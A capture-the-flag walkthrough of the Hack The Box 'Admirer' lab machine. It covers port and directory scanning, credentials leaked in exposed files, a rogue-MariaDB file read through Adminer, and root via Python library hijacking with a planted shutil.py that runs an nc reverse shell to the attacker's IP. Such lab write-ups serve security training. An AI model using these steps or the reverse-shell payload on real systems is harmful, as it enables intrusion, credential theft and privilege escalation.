# Hack the Box - Admirer

```CSS
Machine IP: 10.10.10.187 - Linux

Vulnerabilities:
- Adminer
- Python Library Hijacking
```

# Reconaissance
## NMAP (Surface)
```CSS
▶ nmap -Pn -sS -p- 10.10.10.187 -T4 --min-rate 1000 -oN nmap.surface

Nmap scan report for 10.10.10.187
Host is up (0.100s latency).
Not shown: 65532 closed tcp ports (reset)

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 75.35 seconds
```

## NMAP (Deep)
```CSS
▶ nmap -sC -sV -p 21,22,80 10.10.10.187 -oN nmap.deep

Nmap scan report for 10.10.10.187
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a71e92163699dcbdd84021a2397e1b9 (RSA)
|   256 c595b6214d46a425557a873e19a8e702 (ECDSA)
|_  256 d02dddd05c42f87b315abe57c4a9a756 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-title: Admirer
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```

## Application (Port 80)
![image](https://user-images.githubusercontent.com/83878909/229423143-85c36971-4509-41d0-8710-63c5cf8efe6e.png)

## Brute-Force (Common Directories and Files)
```
▶ gobuster dir --url http://10.10.10.187 --wordlist /seclists/Discovery/Web-Content/common.txt --threads 25
```
![image](https://user-images.githubusercontent.com/83878909/229427047-c09451d1-a6ed-4ccd-89aa-bae599dea65b.png)
  - robots.txt
![image](https://user-images.githubusercontent.com/83878909/229427379-501aadd4-818e-4d55-97d8-daf7fec60a39.png)

```CSS
▶ gobuster dir --url http://10.10.10.187/admin-dir --wordlist /seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extensions php,txt --threads 25
```
![image](https://user-images.githubusercontent.com/83878909/229438336-3f85f7f9-f2b0-4f1f-b238-97f066754b5f.png)
  - contacts.txt
  - credentials.txt
![image](https://user-images.githubusercontent.com/83878909/229438499-9d4192a2-b214-4cdd-b026-8abcf9009cb0.png)
![image](https://user-images.githubusercontent.com/83878909/229438595-3c5b4ddc-cd03-46be-b12a-5a6d84e6b361.png)

---

## FTP Login
  - FTP Login: `ftpuser:%n?4Wz}R$tTF7`
![image](https://user-images.githubusercontent.com/83878909/229441021-6974e5c6-1dd5-4819-97ed-e76d136aab22.png)
  - Download Files: `dump.sql` and `html.tar.gz`.
![image](https://user-images.githubusercontent.com/83878909/229441387-3b270388-ef2e-425b-b68a-1e0b7037d075.png)
  - `dump.sql` : No useful information.
  - `html.tar.gz` : `▶ tar -xvzf html.tar.gz`
![image](https://user-images.githubusercontent.com/83878909/229442818-fc7ff4da-a787-4434-9e9e-b9a0b3ee8cf9.png)
  - `index.php` : Database credentials found `waldo:]F7jLHw:*G>UPrTo}~A"d6b`
![image](https://user-images.githubusercontent.com/83878909/229444624-5870fc15-d309-4d7c-a85a-8c0a5511660d.png)
  - `/utility-scripts/db_admin.php`: Database credentials found `waldo:Wh3r3_1s_w4ld0?`
![image](https://user-images.githubusercontent.com/83878909/229447920-b34a8efb-769a-42de-a16f-a6e808de9bc4.png)
  - `w4ld0s_s3cr3t_d1r/credentials.txt`
![image](https://user-images.githubusercontent.com/83878909/229448581-7a114624-eb66-4323-bdab-bab29630636b.png)

---

## Brute-Force
```
▶ gobuster dir --url http://10.10.10.187/utility-scripts/ --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt --extensions php,txt  --threads 50
```
![image](https://user-images.githubusercontent.com/83878909/229453408-bae74a9a-7686-4194-a828-c8bf131204e1.png)

---

## Application
  - Adminer
![image](https://user-images.githubusercontent.com/83878909/229453875-f4a1d735-6a09-4bb5-a360-44caae6481ce.png)
  - About [Adminer vulnerability](https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool).

---

### Create MariaDB Database and User
  1. Start MariaDB : `systemctl start mariadb`
  2. Login to MariaDB : `mysql -u root -p` (The password is root)
  3. Create database : `CREATE DATABASE PwnMe; USE PwnMe; CREATE TABLE pwned (name VARCHAR(2000));`
  4. Create User : `CREATE USER 'xoxo'@'10.10.10.187' IDENTIFIED BY 'passwd';` ##Specify the Victim IP address
  5. Grant Privileges : `GRANT ALL PRIVILEGES ON PwnMe.* TO 'xoxo'@'10.10.10.187';` ##Specify the Victim IP address
  6. Refersh Privileges : `FLUSH PRIVILEGES;`

## Firewall Exception
- Add a Firewall Exception (if enabled): ufw allow from 10.10.14.34 to any port 3306

## Configure MariaDB to bind to attacker Server/VPN IP address
1. Change Bind address in : `/etc/mysql/mariadb.conf.d/50-server.cnf`
2. Bind Address : Attacker Server/VPN IP `bind-address = 10.10.14.34`
![image](https://user-images.githubusercontent.com/83878909/229495035-73e3bf04-05d5-4660-8b6e-a08c37946d42.png)

## Restart and Check Service
- Restart MariaDB server and check that the service is listening on the correct port
```CSS
▶ systemctl restart mariadb
▶ netstat -pano | less
```
![image](https://user-images.githubusercontent.com/83878909/229494627-683d637e-0a9f-4e7e-ba61-25471d2f19e3.png)

---

## Exploit
  - Login using the created database and credentials.
![image](https://user-images.githubusercontent.com/83878909/229499456-19111d24-a091-4402-be57-f7566ffca780.png)
![image](https://user-images.githubusercontent.com/83878909/229498960-f29142fc-f648-45c1-83ae-cece1cf58fd6.png)

### Exfiltrate Data
  - SQL Command: `LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE PwnMe.pwned FIELDS TERMINATED BY "\n"`
![image](https://user-images.githubusercontent.com/83878909/229501451-a5e334eb-59c5-4484-aa72-266bce45efce.png)
  - Read from Local Database: `SELECT * FROM pwned;` ##Table Name
  - Credentials Found: `waldo:&<h5b~yK3F#{PaPB&dA}{H>`
![image](https://user-images.githubusercontent.com/83878909/229502059-1cc7ece1-2c10-4c1a-bb33-23a69e796c10.png)

## SSH Login
  - SSH: `ssh waldo@10.10.10.187`
![image](https://user-images.githubusercontent.com/83878909/229502832-cd439abd-e8bd-4a93-8613-2c2696b97cc8.png)

---

## Privilege Escalation
  - Check for commands user `waldo` can run with `sudo` privileges.
![image](https://user-images.githubusercontent.com/83878909/229505608-c3ef4196-8607-4701-ae8c-ebdc738e01f7.png)

  - Found a python script `backup.py` which used a library `shutil`.
![image](https://user-images.githubusercontent.com/83878909/229525273-91529626-73d5-48f5-8212-2100ecf7b411.png)

  - The library can be hijacked by creating a malicious library which contains a reverse shell payload. Then create a python path variable to make python read the malicious library from a desired location instead of the original library from its default location.
    - `cd /dev/shm/`
    - `vi shutil.py`
```CSS
import os
import socket
import subprocess

def make_archive(a, b, c):
	os.system("nc -c /bin/bash 10.10.14.34 9001")
```
  - Path Variable: `PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh`
  - Execute `admin_tasks.sh`: `sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh` 
![image](https://user-images.githubusercontent.com/83878909/229532359-cb9e382b-39e4-415f-82df-a219b48fc510.png)

## Root
![image](https://user-images.githubusercontent.com/83878909/229532625-f3016ed2-f7c2-4869-ae31-7407ffa268df.png)
